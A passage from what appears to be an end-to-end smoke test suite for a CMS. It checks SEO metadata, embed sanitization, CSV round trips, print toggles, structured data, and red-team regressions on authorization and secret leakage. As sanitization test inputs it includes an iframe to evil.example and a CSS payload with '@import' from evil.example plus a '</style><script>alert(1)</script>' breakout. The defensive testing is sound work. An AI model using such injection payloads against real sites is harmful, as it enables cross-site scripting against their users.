          excerpt: 'The excerpt.', status: 'published',
          meta_title: 'Meta Title Wins', meta_description: 'Meta description wins.',
        }),
      });

      const html = await (await fetch(`${BASE}/blog/${seoSlug}`)).text();

      // EMBEDS (C-44). Three properties, on a real request:
      //   1. an iframe pasted into content is still destroyed on save — the
      //      whole design depends on that not having been relaxed;
      //   2. a valid placeholder survives and renders as a facade;
      //   3. the facade makes NO third-party request before a click, which is
      //      the difference between a privacy facade and a lazy-loaded embed.
      const embedSlug = `smoke-embed-${Date.now()}`;
      const embedRes = await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: seoHdrs,
        body: JSON.stringify({
          title: 'Embed smoke', slug: embedSlug, status: 'published',
          content: '<p>before</p>'
            + '<iframe src="https://evil.example/x"></iframe>'
            + '<div class="ab-embed" data-embed-provider="youtube" data-embed-id="dQw4w9WgXcQ"></div>'
            + '<div class="ab-embed" data-embed-provider="evil" data-embed-id="x"></div>',
        }),
      });
      const embedJson = await embedRes.json().catch(() => null);
      const storedEmbed = embedJson?.data?.content ?? '';
      if (!/iframe/i.test(storedEmbed) && !/evil\.example/.test(storedEmbed))
        ok('a pasted iframe is destroyed on save, as it always was');
      else fail('iframe allowed', storedEmbed.slice(0, 160));
      if (/data-embed-provider="youtube"/.test(storedEmbed) && !/data-embed-provider="evil"/.test(storedEmbed))
        ok('...a valid embed placeholder survives, an invalid one loses its attributes');
      else fail('embed placeholder', storedEmbed.slice(0, 200));

      const embedHtml = await (await fetch(`${BASE}/blog/${embedSlug}`)).text();
      if (/data-embed-load/.test(embedHtml)) ok('the article renders a click-to-load facade');
      else fail('embed facade missing', 'no data-embed-load in the rendered article');
      const article = embedHtml.slice(embedHtml.indexOf('ab-embed-facade'), embedHtml.indexOf('ab-embed-facade') + 900);
      if (!/<iframe/i.test(article) && !/youtube-nocookie\.com\/embed/.test(article))
        ok('...and it contacts nobody before the reader clicks');
      else fail('facade fetches', article.slice(0, 200));

      // EXPORT / IMPORT (C-91), as an actual round trip: take the posts out as
      // CSV, change a title in the file, put it back, and read the record.
      // Proving the parser against a fixture would prove the parser; this
      // proves the FEATURE, which is "an operator edits a spreadsheet".
      const txRes = await fetch(`${BASE}/api/transfer/post?format=csv`, { headers: seoHdrs });
      // arrayBuffer, not text(): the fetch spec's UTF-8 decode REMOVES a
      // leading BOM, so `.text()` can never see the one Excel needs. The first
      // draft of this assertion could not have passed whatever the route did.
      const txBytes = new Uint8Array(await txRes.arrayBuffer());
      const txCsv = new TextDecoder('utf-8').decode(txBytes).replace(/^\uFEFF/, '');
      if (txRes.ok && /(^|\r?\n)?[\uFEFF]?id,title,slug/.test(txCsv)) ok('posts export as CSV, with the header the importer expects');
      else fail('content export', `status=${txRes.status} ${txCsv.slice(0, 80)}`);
      if (txBytes[0] === 0xef && txBytes[1] === 0xbb && txBytes[2] === 0xbf)
        ok('...and carry a BOM, so Excel reads Greek titles correctly');
      else fail('export BOM', `first bytes ${[...txBytes.slice(0, 3)].join(',')}`);
      if (!/,views(,|\r|$)/.test(txCsv.split('\n')[0])) ok('...and do NOT export the view counter');
      else fail('export views', 'a re-import would reset analytics');

      // An anonymous caller may not have the site's whole content.
      const txAnon = await fetch(`${BASE}/api/transfer/post?format=csv`);
      if (txAnon.status === 401 || txAnon.status === 403) ok('an anonymous caller cannot export the site');
      else fail('export open', `status=${txAnon.status}`);

      const txLines = txCsv.replace(/^\uFEFF/, '').split(/\r?\n/).filter(Boolean);
      const txHeader = txLines[0].split(',');
      const slugCol = txHeader.indexOf('slug');
      const titleCol = txHeader.indexOf('title');
      const target = txLines.slice(1).find((l) => l.includes(embedSlug));
      if (target && slugCol >= 0 && titleCol >= 0) {
        // One row, edited the way a person would: a new title with a comma in
        // it, which is the character that breaks every naive CSV writer.
        const edited = `${txLines[0]}\r\n` + [
          txHeader.map((h) => (h === 'slug' ? embedSlug : h === 'title' ? '"Renamed, by hand"' : '')).join(','),
        ].join('\r\n');

        const preview = await fetch(`${BASE}/api/transfer/post`, {
          method: 'POST', headers: seoHdrs, body: JSON.stringify({ body: edited, format: 'csv' }),
        });
        const previewJson = await preview.json().catch(() => null);
        if (previewJson?.data?.updates === 1 && previewJson?.data?.creates === 0)
          ok('an import previews as one update, and writes nothing yet');
        else fail('import preview', JSON.stringify(previewJson?.data ?? previewJson).slice(0, 160));

        const stillOld = await (await fetch(`${BASE}/blog/${embedSlug}`)).text();
        if (/Embed smoke/.test(stillOld)) ok('...the preview really did not write');
        else fail('preview wrote', 'the post changed before the import was applied');

        const applied = await fetch(`${BASE}/api/transfer/post`, {
          method: 'POST', headers: seoHdrs, body: JSON.stringify({ body: edited, format: 'csv', apply: true }),
        });
        const appliedJson = await applied.json().catch(() => null);
        if (appliedJson?.data?.updated === 1) ok('...and applying it updates exactly one record');
        else fail('import apply', JSON.stringify(appliedJson?.data ?? appliedJson).slice(0, 160));

        const after = await (await fetch(`${BASE}/blog/${embedSlug}`)).text();
        if (/Renamed, by hand/.test(after)) ok('...the comma in the edited title survived the round trip');
        else fail('round trip', 'the new title is not on the page');
      } else fail('export row', `no row for ${embedSlug} in the export`);

      // PRINT (C-152). The stylesheet half shipped in a bundled plugin that
      // seeds INACTIVE, so a fresh install printed its whole navigation while
      // the fix waited in a list nobody had opened. The button is asserted on a
      // real response, ON by default, and then switched OFF and asserted gone —
      // a switch that only ever reads one way is a switch nobody has tested.
      if (/data-print-article/.test(html)) ok('an article carries the print button by default');
      else fail('print button missing', 'no data-print-article on a published post');
      if (/class="no-print[^"]*"[\s\S]{0,400}data-print-article/.test(html))
        ok('...and the button is itself excluded from the printout');
      else fail('print button prints itself', 'no no-print wrapper around it');

      const printOff = await fetch(`${BASE}/api/settings/update`, {
        method: 'POST',
        headers: {
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
        },
        body: JSON.stringify({ print_button: false }),
      });
      const offHtml = await (await fetch(`${BASE}/blog/${seoSlug}`)).text();
      if (printOff.ok && !/data-print-article/.test(offHtml)) ok('...and switching it off removes it');
      else fail('print switch inert', `update=${printOff.status}, button still present=${/data-print-article/.test(offHtml)}`);
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST',
        headers: {
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
        },
        body: JSON.stringify({ print_button: true }),
      });

      if (/<title>[^<]*Meta Title Wins/.test(html)) ok('meta_title reaches <title>');
      else fail('meta_title inert', (html.match(/<title>[^<]*/) ?? [''])[0]);

      if (/name="description"[^>]*Meta description wins\./.test(html)) ok('meta_description reaches the head');
      else fail('meta_description inert', (html.match(/name="description"[^>]*/) ?? [''])[0]);

      // The old behaviour used the excerpt; assert it no longer wins.
      if (!/name="description"[^>]*The excerpt\./.test(html)) ok('...and the excerpt no longer overrides it');
      else fail('excerpt still used', 'excerpt won over meta_description');

      // JSON-LD is how a post becomes a rich result rather than just a page.
      const ld = html.match(/<script type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/);
      if (ld) {
        ok('JSON-LD is emitted');
        let parsed = null;
        try { parsed = JSON.parse(ld[1]); } catch { /* reported below */ }
        // Invalid JSON-LD is silently ignored by search engines, so parsing is
        // the assertion that matters, not presence.
        if (parsed) ok('...and it is valid JSON');
        else fail('JSON-LD invalid', ld[1].slice(0, 120));
        const types = (parsed?.['@graph'] ?? []).map((n) => n['@type']);
        if (types.includes('BlogPosting') && types.includes('BreadcrumbList')) {
          ok('...carrying BlogPosting + BreadcrumbList');
        } else fail('JSON-LD types', JSON.stringify(types));

        // The visible trail and the BreadcrumbList must be the SAME list. A
        // mismatch is worse than having neither: search engines treat it as a
        // reason to distrust the whole page, and it is exactly what happens
        // when the two are built separately.
        const crumbNode = (parsed?.['@graph'] ?? []).find((n) => n['@type'] === 'BreadcrumbList');
        const ldNames = (crumbNode?.itemListElement ?? []).map((i) => i.name);
        const nav = html.match(/<nav[^>]*aria-label="Breadcrumb"[\s\S]*?<\/nav>/);
        if (nav) {
          ok('the trail is RENDERED, not only declared to crawlers');
          const visible = [...nav[0].matchAll(/>([^<>]+)<\/(?:a|span)>/g)]
            .map((m) => m[1].trim())
            .filter((s) => s && s !== '›' && s !== '/' && s !== '·');
          if (JSON.stringify(visible) === JSON.stringify(ldNames)) {
            ok('...and it matches the BreadcrumbList exactly');
          } else fail('trail/JSON-LD mismatch', `visible=${JSON.stringify(visible)} ld=${JSON.stringify(ldNames)}`);
          if (/aria-current="page"/.test(nav[0])) ok('...with the current page marked, not linked');
          else fail('breadcrumb a11y', 'no aria-current="page" in the trail');
        } else fail('breadcrumb missing', 'no rendered breadcrumb nav on a post page');
      } else fail('JSON-LD missing', 'no ld+json block in the rendered page');

      // The head slot was never forwarded by PublicLayout, so anything a page
      // put in <head> was dropped. This is the canary for that.
      if (/smoke-seo\.example\.com/.test(html)) ok('the Site URL setting reaches the rendered page');
      else fail('site_url inert in page', 'setting not present in HTML');

      // Structured data on the OTHER public surfaces — the home page and the
      // archive had none at all before, which is how a site ends up with a
      // rich result for its posts and nothing for itself.
      const homeHtml = await (await fetch(`${BASE}/`)).text();
      const homeLd = homeHtml.match(/<script type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/);
      let homeParsed = null;
      try { homeParsed = homeLd ? JSON.parse(homeLd[1]) : null; } catch { /* reported by the assertion */ }
      const homeTypes = (homeParsed?.['@graph'] ?? []).map((n) => n['@type']);
      if (homeTypes.includes('Organization') && homeTypes.includes('WebSite')) {
        ok('the home page declares Organization + WebSite');
      } else fail('home structured data', JSON.stringify(homeTypes));

      const archiveHtml = await (await fetch(`${BASE}/blog`)).text();
      const archiveLd = archiveHtml.match(/<script type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/);
      let archiveParsed = null;
      try { archiveParsed = archiveLd ? JSON.parse(archiveLd[1]) : null; } catch { /* reported by the assertion */ }
      const archiveTypes = (archiveParsed?.['@graph'] ?? []).map((n) => n['@type']);
      if (archiveTypes.includes('CollectionPage') && archiveTypes.includes('BreadcrumbList')) {
        ok('the archive declares CollectionPage + BreadcrumbList');
      } else fail('archive structured data', JSON.stringify(archiveTypes));
      // Both reachable states of `mainEntity` used to satisfy this: the node
      // is either an ItemList or absent, and `!list ||` accepted absent — so
      // an archive that listed NOTHING passed the "listing its posts" check.
      // Assert the list exists, is non-empty, and names the posts the page
      // actually rendered; that last part is the one thing the unit test
      // (which builds its own items) can never check.
      const list = (archiveParsed?.['@graph'] ?? []).find((n) => n['@type'] === 'CollectionPage')?.mainEntity;
      const listEntries = list?.itemListElement ?? [];
      if (list?.['@type'] === 'ItemList' && list.numberOfItems >= 1 && listEntries.length === list.numberOfItems) {
        ok('...listing its posts as a non-empty ItemList');
      } else fail('archive ItemList', JSON.stringify(list)?.slice(0, 160));
      // Compared by URL, not by title: titles are rendered by whichever THEME
      // is active (and HTML-escaped on the way out), so a title comparison
      // tests the theme's markup rather than the structured data. Every URL
      // the list advertises must be a link the page actually offers — that is
      // the regression worth catching (a list naming posts the reader cannot
      // see, or naming nothing at all).
      const listPaths = listEntries
        .map((i) => (typeof i.url === 'string' ? i.url.replace(/^https?:\/\/[^/]+/, '') : null))
        .filter(Boolean);
      const missing = listPaths.filter((u) => !archiveHtml.includes(`href="${u}"`));
      if (listPaths.length > 0 && missing.length === 0) {
        ok('...and every URL in that list is a link the page actually renders');
      } else fail('archive ItemList vs rendered', `paths=${listPaths.length} missing=${JSON.stringify(missing.slice(0, 3))}`);

      // A crawler must not be handed a localhost URL on a live site: every
      // absolute URL comes from the resolved origin or is omitted entirely.
      const allLd = [ld?.[1], homeLd?.[1], archiveLd?.[1]].filter(Boolean).join(' ');
      if (!/localhost/.test(allLd)) ok('no structured-data URL leaks a localhost origin');
      else fail('localhost in JSON-LD', allLd.match(/[^"]*localhost[^"]*/)?.[0] ?? '');

      const sitemap = await (await fetch(`${BASE}/sitemap.xml`)).text();
      if (/smoke-seo\.example\.com/.test(sitemap)) ok('...and drives sitemap.xml');
      else fail('site_url inert in sitemap', sitemap.slice(0, 140));

      const feed = await (await fetch(`${BASE}/rss.xml`)).text();
      if (/smoke-seo\.example\.com/.test(feed)) ok('...and drives rss.xml');
      else fail('site_url inert in rss', feed.slice(0, 140));

      // ...and the admin's "View site" button, which was a hard-coded "/": on a
      // headless install that opened the CMS's own pages, not the storefront.
      const adminHtml = await (await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } })).text();
      if (/href="https:\/\/smoke-seo\.example\.com"[^>]*target="_blank"/.test(adminHtml)) {
        ok('...and the admin View site button opens it');
      } else fail('View site ignores site_url', (adminHtml.match(/<a[^>]*target="_blank"[^>]*>/) ?? [''])[0].slice(0, 160));
    }

    // --- red-team regressions ---
    // A red-team pass over the Phase D fixes found they were correct on the
    // routes they touched and absent everywhere else. These pin the routes
    // that were missed, because "I fixed the rule" is not the same as "I found
    // every caller".
    {
      const rtHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };

      // The change feed stores FULL entity snapshots — draft bodies and orders
      // with customer name, email, phone and address. It gated on `if (user)`,
      // so any session (or scoped key) read all of it.
      const anonChanges = await (await fetch(`${BASE}/api/content/changes`)).json().catch(() => null);
      const anonBlob = JSON.stringify(anonChanges ?? {});
      if (!/"content"\s*:/.test(anonBlob) && !/"email"\s*:/.test(anonBlob)) {
        ok('the change feed gives anonymous callers no snapshot bodies');
      } else fail('change feed leaks to anonymous', anonBlob.slice(0, 200));

      // The feed is bounded and paged (U-15). tests/change-feed.test.mjs drives
      // the route handler in-process on all three drivers; these go through the
      // real server, so the middleware sees the new query parameters too.
      const noSince = await fetch(`${BASE}/api/content/changes`);
      const noSinceBody = await noSince.json().catch(() => null);
      if (noSince.status === 200 && Array.isArray(noSinceBody?.data) && noSinceBody.data.length <= 1000
          && typeof noSinceBody?.meta?.has_more === 'boolean' && typeof noSinceBody?.meta?.truncated === 'boolean') {
        ok('the change feed without `since` is a bounded page, never a 400');
      } else fail('change feed default window', `status=${noSince.status} ${JSON.stringify(noSinceBody?.meta)}`);

      const pageA = await (await fetch(`${BASE}/api/content/changes?limit=2`)).json().catch(() => null);
      const metaA = pageA?.meta ?? {};
      if (Array.isArray(pageA?.data) && pageA.data.length <= 2 && metaA.limit === 2
          && (metaA.has_more ? typeof metaA.next_cursor === 'string' : metaA.next_cursor === null)) {
        ok('the change feed honours `limit` and reports has_more / next_cursor');
      } else fail('change feed paging meta', JSON.stringify(metaA).slice(0, 200));
      if (metaA.has_more && pageA.data.length === 2) {
        const pageB = await (await fetch(`${BASE}/api/content/changes?limit=2&cursor=${encodeURIComponent(metaA.next_cursor)}`)).json().catch(() => null);
        const seenA = new Set(pageA.data.map((c) => c.id));
        const lastA = pageA.data[pageA.data.length - 1];
        const olderAndNew = (pageB?.data ?? []).every((c) => !seenA.has(c.id) && c.timestamp <= lastA.timestamp);
        if (Array.isArray(pageB?.data) && pageB.data.length > 0 && olderAndNew) {
          ok('following next_cursor returns the next, older page with no repeats');
        } else fail('change feed cursor', JSON.stringify(pageB)?.slice(0, 200));
      }

      const badCursor = await fetch(`${BASE}/api/content/changes?cursor=not-a-cursor`);
      if (badCursor.status === 400) ok('a malformed change-feed cursor is a 400, not page one again');
      else fail('change feed malformed cursor', `status=${badCursor.status}`);

      // An admin is editorial, so snapshots are legitimate here — the assertion
      // is that the route still works, not that it is empty.
      const staffChanges = await fetch(`${BASE}/api/content/changes`, { headers: rtHdrs });
      if (staffChanges.status === 200) ok('...while editorial roles still get the feed');
      else fail('change feed for staff', `status=${staffChanges.status}`);

      // Secrets must not come back from the settings route for ANY role. The
      // deny-list used to be skipped entirely when the caller was staff.
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: rtHdrs,
        body: JSON.stringify({ smtp_password: 'rt-secret-smtp', stripe_secret_key: 'sk_test_rt_secret' }),
      });
      const asAdmin = await (await fetch(`${BASE}/api/settings/get`, { headers: rtHdrs })).text();
      if (!asAdmin.includes('rt-secret-smtp') && !asAdmin.includes('sk_test_rt_secret')) {
        ok('settings never return secret VALUES, even to an admin');
      } else fail('secret leaked via settings', 'smtp_password or stripe key present in the response');
      if (/smtp_password__is_set/.test(asAdmin)) ok('...but do report whether a secret is set');
      else fail('is_set flag missing', asAdmin.slice(0, 200));

      const asAnon = await (await fetch(`${BASE}/api/settings/get`)).text();
      if (!asAnon.includes('rt-secret-smtp') && !asAnon.includes('sk_test_rt_secret')) {
        ok('...and anonymous callers still see no secrets');
      } else fail('anonymous secret leak', asAnon.slice(0, 160));

      // The OG card is a public PNG that renders the post title. A draft slug
      // must 404 rather than answer, or it is a title oracle.
      const ogSlug = `smoke-og-draft-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: rtHdrs,
        body: JSON.stringify({ title: 'Unannounced', slug: ogSlug, content: '<p>x</p>', status: 'draft' }),
      });
      const og = await fetch(`${BASE}/og/${ogSlug}.png`);
      if (og.status === 404) ok('the OG image refuses an unpublished slug');
      else fail('OG draft-title oracle', `status=${og.status} (expected 404)`);

      // S5.4: the card is rendered once per PICTURE. A query string changes
      // nothing about it, so it must not change the bytes either; the author of
      // a draft may see its card, but never with a shareable Cache-Control.
      const ogOwn = await fetch(`${BASE}/og/${ogSlug}.png`, { headers: { Cookie: sessionCookie } });
      await ogOwn.arrayBuffer();
      if (ogOwn.status === 200 && ogOwn.headers.get('cache-control') === 'private, no-store') {
        ok('OG: a draft card shown to staff is private, no-store');
      } else fail('OG draft cacheable', `status=${ogOwn.status} cc=${ogOwn.headers.get('cache-control')}`);

      const pubSlug = `smoke-og-live-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: rtHdrs,
        body: JSON.stringify({ title: 'Announced', slug: pubSlug, content: '<p>x</p>', status: 'published' }),
      });
      const card1 = await fetch(`${BASE}/og/${pubSlug}.png`);
      const card1Bytes = Buffer.from(await card1.arrayBuffer());
      const card2 = await fetch(`${BASE}/og/${pubSlug}.png?v=${Date.now()}`);
      const card2Bytes = Buffer.from(await card2.arrayBuffer());
      if (card1.status === 200 && card2.status === 200 && card1Bytes.equals(card2Bytes)) {
        ok('OG: a query string serves the same card');
      } else fail('OG query variant', `status=${card1.status}/${card2.status} same=${card1Bytes.equals(card2Bytes)}`);
      if (card1.headers.get('cache-control') === 'public, max-age=86400') ok('OG: ...still cached for a day at the edge');
      else fail('OG cache-control', String(card1.headers.get('cache-control')));
      const cardTag = card1.headers.get('etag');
      if (cardTag) {
        const card3 = await fetch(`${BASE}/og/${pubSlug}.png`, { headers: { 'If-None-Match': cardTag } });
        const card3Body = await card3.text();
        if (card3.status === 304 && card3Body === '') ok('OG: ...and revalidates with a bodiless 304');
        else fail('OG 304', `status=${card3.status}`);
      } else if ((card1.headers.get('content-type') || '').startsWith('image/svg')) {
        ok('OG: sharp unavailable here — SVG fallback, no validator expected');
      } else fail('OG etag', 'a PNG card came back with no ETag');

      // A user-shaped response must never carry the second factor, from ANY
      // route — users/update hand-rolled its own strip and forgot two_factor.
      const meRes = await (await fetch(`${BASE}/api/auth/me`, { headers: rtHdrs })).text();
      const meLeaks = /"two_factor"\s*:\s*\{/.test(meRes) || /"backup_codes"\s*:/.test(meRes);
      if (!meLeaks) ok('/api/auth/me carries no second-factor material');
      else fail('me leaks 2FA', meRes.slice(0, 160));
    }

    // --- read-side authorization ---
    // Where DB-enforced row-level security makes a forgotten check return
    // NOTHING, this design makes a forgotten check return EVERYTHING. It has
    // happened twice (settings dump, media enumeration), so these assertions
    // drive the real HTTP surface rather than the helper.
    {
      const authHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };

      // Listing every uploaded file is an inventory of the site. Serving the
      // FILES stays public; enumerating them must not be.
      const anonMedia = await fetch(`${BASE}/api/media/get`);
      if (anonMedia.status === 401 || anonMedia.status === 403) ok('media list refuses anonymous callers');
      else fail('media enumeration', `status=${anonMedia.status} (expected 401/403)`);

      const authedMedia = await fetch(`${BASE}/api/media/get`, { headers: authHdrs });
      if (authedMedia.status === 200) ok('...and still serves the admin');
      else fail('media list for admin', `status=${authedMedia.status}`);

      // --- every role that may UPLOAD must be able to READ ---
      //
      // The read guard was a hand-written `admin | editor | author` list and
      // was never updated when `manager` arrived, while uploads gate on
      // canAuthorPosts(), which includes them. So a shop manager could upload
      // an image and then not see it: /admin/media said "No media yet", and the
      // product form's image picker came back empty — which it then reported as
      // "the library is empty" in a BLOCKING dialog that froze the tab.
      //
      // Driven per role rather than asserted about the predicate, because the
      // predicate was never the problem; the second copy of it was.
      {
        const mkStaff = async (role, email) => {
          const made = await fetch(`${BASE}/api/users/create`, {
            method: 'POST', headers: authHdrs,
            body: JSON.stringify({ name: `Media ${role}`, email, password: 'MediaPass#123', role }),
          });
          if (made.status !== 201) return null;
          const login = await fetch(`${BASE}/api/auth/login`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password: 'MediaPass#123' }),
          });
          const m = /astrobaas_session=([^;]+)/.exec(login.headers.get('set-cookie') || '');
          return m ? `astrobaas_session=${m[1]}` : null;
        };

        for (const role of ['manager', 'editor', 'author']) {
          const cookie = await mkStaff(role, `media-${role}-${Date.now().toString(36)}@example.com`);
          if (!cookie) { fail(`media role setup (${role})`, 'could not create/login'); continue; }
          const res = await fetch(`${BASE}/api/media/get`, { headers: { Cookie: cookie } });
          if (res.status === 200) ok(`a ${role} can read the media library (they can upload to it)`);
          else fail(`media read for ${role}`, `status=${res.status} (expected 200)`);
        }

        // …and a role that may NOT author still cannot enumerate the library.
        const viewerCookie = await mkStaff('viewer', `media-viewer-${Date.now().toString(36)}@example.com`);
        if (viewerCookie) {
          const res = await fetch(`${BASE}/api/media/get`, { headers: { Cookie: viewerCookie } });
          if (res.status === 403) ok('a viewer still cannot enumerate the media library');
          else fail('media read for viewer', `status=${res.status} (expected 403)`);
        } else fail('media role setup (viewer)', 'could not create/login');
      }

      // 2FA material must never leave the server. An admin who can read another
      // admin's TOTP secret can enrol it, which makes 2FA a second copy of the
      // first factor rather than a second factor.
      const usersRes = await fetch(`${BASE}/api/users/get`, { headers: authHdrs });
      const usersBody = await usersRes.text();
      const leaks = /"two_factor"\s*:\s*\{/.test(usersBody)
        || /"secret"\s*:/.test(usersBody)
        || /"backup_codes"\s*:/.test(usersBody)
        || /password_hash|password_salt/.test(usersBody);
      if (!leaks) ok('GET /api/users/get leaks no secret material');
      else fail('user secret leak', usersBody.slice(0, 200));
      if (/two_factor_enabled/.test(usersBody)) ok('...while still reporting whether 2FA is on');
      else fail('two_factor_enabled missing', usersBody.slice(0, 160));

      // Anonymous callers still must not see unpublished bodies.
      const draftSlug = `smoke-draft-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: authHdrs,
        body: JSON.stringify({ title: 'Embargoed', slug: draftSlug, content: '<p>secret</p>', status: 'draft' }),
      });
      const anonDraft = await fetch(`${BASE}/api/posts/${draftSlug}`);
      if (anonDraft.status === 404) ok('an anonymous caller cannot read a draft');
      else fail('anonymous draft read', `status=${anonDraft.status} (expected 404)`);

      const anonList = await (await fetch(`${BASE}/api/posts?limit=100`)).json().catch(() => null);
      const anonHasDraft = JSON.stringify(anonList?.data ?? []).includes(draftSlug);
      if (!anonHasDraft) ok('...and it is absent from the anonymous list');
      else fail('draft leaked into the public list', draftSlug);

      // The admin who wrote it still sees it.
      const ownerDraft = await fetch(`${BASE}/api/posts/${draftSlug}`, { headers: authHdrs });
      if (ownerDraft.status === 200) ok('an editor/admin still reads drafts');
      else fail('admin draft read', `status=${ownerDraft.status}`);
    }

    // A GET must round-trip through a PUT without changing the resource.
    //
    // The post read routes returned plugin FILTER OUTPUT under the same field
    // name as the stored content, so the admin editor read a derived view and
    // saved it back: activate a plugin, open a post, save, and its injected
    // markup was baked into the post permanently, cumulatively, surviving
    // deactivation. Same shape as the variants data-loss bug, which is why
    // this test drives the whole flow instead of checking a function.
    {
      const pHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      const ORIGINAL = '<p>Original body text that must survive a round trip.</p>';
      const rtSlug = `smoke-roundtrip-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: pHdrs,
        body: JSON.stringify({ title: 'Round trip', slug: rtSlug, content: ORIGINAL, status: 'published' }),
      });
      // Any content-filtering plugin will do; reading-time ships bundled.
      await fetch(`${BASE}/api/plugins/toggle`, {
        method: 'POST', headers: pHdrs, body: JSON.stringify({ id: 'reading-time', active: true }),
      });

      const readBack = await (await fetch(`${BASE}/api/posts/${rtSlug}`, { headers: pHdrs })).json().catch(() => null);
      const rec = readBack?.data;
      if (rec?.content === ORIGINAL) ok('GET /api/posts/{ref} returns RAW content, safe to write back');
      else fail('post GET returns derived content', `content=${JSON.stringify(rec?.content)?.slice(0, 120)}`);

      // The exact destructive move: save back what the editor just read.
      await fetch(`${BASE}/api/posts/${rtSlug}`, { method: 'PUT', headers: pHdrs, body: JSON.stringify(rec) });
      const after = await (await fetch(`${BASE}/api/posts/${rtSlug}`, { headers: pHdrs })).json().catch(() => null);
      if (after?.data?.content === ORIGINAL) ok('a read-modify-write does not bake plugin output into stored content');
      else fail('plugin output baked into post', `stored=${JSON.stringify(after?.data?.content)?.slice(0, 160)}`);
    }

    // Deactivating a plugin must revoke EVERY capability it registered, not
    // just the ones the plugin manager happens to own. Content types lived in
    // a separate registry with no unregister, so a deactivated plugin's
    // collections stayed readable and writeable until the next restart.
    {
      const pHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      await fetch(`${BASE}/api/plugins/toggle`, {
        method: 'POST', headers: pHdrs, body: JSON.stringify({ id: 'product-catalog', active: true }),
      });
      const live = await fetch(`${BASE}/api/content/catalog-item`, { headers: pHdrs });
      if (live.status === 200) ok('an active plugin\'s content type is queryable');
      else fail('content type not live while active', `status=${live.status}`);

      await fetch(`${BASE}/api/plugins/toggle`, {
        method: 'POST', headers: pHdrs, body: JSON.stringify({ id: 'product-catalog', active: false }),
      });
      const gone = await fetch(`${BASE}/api/content/catalog-item`, { headers: pHdrs });
      if (gone.status === 404) ok('deactivating a plugin revokes its content type');
      else fail('content type leaked after deactivation', `status=${gone.status} (expected 404)`);

      const wrote = await fetch(`${BASE}/api/content/catalog-item`, {
        method: 'POST', headers: pHdrs, body: JSON.stringify({ name: 'ghost' }),
      });
      if (wrote.status === 404) ok('...and refuses writes to the revoked type');
      else fail('write to revoked content type', `status=${wrote.status} (expected 404)`);
    }

    // EVERY customizer field must reach the page, not just the one that
    // happened to be wired. An end-to-end audit found that of five colours,
    // two fonts and a font size, only --primary-color changed a pixel:
    // backgroundColor and textColor had zero consumers, fontSize was never
    // even emitted, and the chosen font family was applied as font-family
    // while only Inter was ever fetched. All of it returned
    // 200 "Theme updated successfully".
    {
      const tHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      const setAll = await fetch(`${BASE}/api/themes/update`, {
        method: 'POST', headers: tHdrs,
        body: JSON.stringify({ settings: {
          backgroundColor: '#dd0044', textColor: '#ee0055',
          headingFont: 'Playfair Display', bodyFont: 'Raleway', fontSize: '19px',
        } }),
      });
      const tcss = await (await fetch(`${BASE}/theme.css`)).text();
      if (setAll.status === 200 && /--background-color:\s*#dd0044/i.test(tcss) && /--text-color:\s*#ee0055/i.test(tcss)) {
        ok('theme background + text colours reach /theme.css');
      } else fail('theme colour tokens', `status=${setAll.status} css=${tcss.slice(0, 160)}`);

      if (/--font-size-base:\s*19px/.test(tcss)) ok('theme fontSize is emitted (was stored but never served)');
      else fail('theme fontSize token', tcss.slice(0, 200));

      // The token is worthless if nothing consumes it, which is exactly how
      // these shipped inert. Assert the stylesheet actually references them.
      const globalCss = await (await fetch(`${BASE}/`)).text();
      const home = globalCss;
      if (/fonts\.googleapis\.com[^"']*Playfair\+Display/.test(home)) {
        ok('the chosen webfont is actually REQUESTED by the page');
      } else fail('webfont link', (home.match(/fonts\.googleapis[^"']*/) ?? ['(no google fonts link)'])[0]);

      // A stored font outside the admin's hardcoded list must not be silently
      // replaced by the first option and written back on the next save.
      await fetch(`${BASE}/api/themes/update`, {
        method: 'POST', headers: tHdrs,
        body: JSON.stringify({ settings: { headingFont: 'Comic Neue' } }),
      });
      const adminHtml = await (await fetch(`${BASE}/admin/themes`, { headers: { Cookie: sessionCookie } })).text();
      if (/<option[^>]*value="Comic Neue"/.test(adminHtml)) ok('a stored font outside the preset list survives the admin form');
      else fail('font option injection', 'stored font is not offered as an option');
    }

    // Custom CSS: stored, sanitized, and appended to the same stylesheet. The
    // dangerous bits (@import, </style>, javascript:) must be stripped.
    const hostile = '.smoke-custom{color:#123456}\n@import url(https://evil.example/x.css);\n</style><script>alert(1)</script>';
    const setCss = await fetch(`${BASE}/api/themes/update`, {
      method: 'POST',
      headers: {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify({ settings: { customCSS: hostile } }),
    });
    const css2 = await (await fetch(`${BASE}/theme.css`)).text();
